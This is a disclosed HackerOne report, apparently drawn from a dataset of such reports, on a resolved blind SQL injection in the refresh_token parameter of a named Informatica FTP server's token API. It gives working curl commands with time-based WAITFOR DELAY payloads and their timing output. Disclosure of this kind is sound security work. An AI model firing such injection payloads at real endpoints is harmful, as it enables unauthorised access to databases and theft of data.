---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1034625'
original_report_id: '1034625'
title: Blind SQL injection at tsftp.informatica.com
weakness: SQL Injection
team_handle: informatica
created_at: '2020-11-14T17:39:02.503Z'
disclosed_at: '2020-11-16T10:32:06.952Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 66
tags:
- hackerone
- sql-injection
---

# Blind SQL injection at tsftp.informatica.com

## Metadata

- HackerOne Report ID: 1034625
- Weakness: SQL Injection
- Program: informatica
- Disclosed At: 2020-11-16T10:32:06.952Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

The parameter `refresh_token` sent to the REST path /api/v1/token is vulnerable to blind SQL injection.

Compare the response time of these 2 requests:

```
$ time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--"
{"error":"invalid_grant"}curl -X POST "https://tsftp.informatica.com/api/v1/token" -H  -H  -d   0.02s user 0.01s system 1% cpu 2.048 total
```

vs

```
$ time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:13'--"
{"error":"invalid_grant"}curl -X POST "https://tsftp.informatica.com/api/v1/token" -H  -H  -d   0.02s user 0.01s system 0% cpu 14.045 total
```
and notice that the WAITFOR DELAY command is executed.

## Impact

Blind SQL injection can be exploited to exfiltrate data from the FTP server, bypass authentication or for remote code execution.

I stopped my testing at the time-based PoC because I didn't want to risk accessing sensitive data. If you would like to though, I can continue exploiting this vulnerability to present the above impact in practice, eg by getting the database version string.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
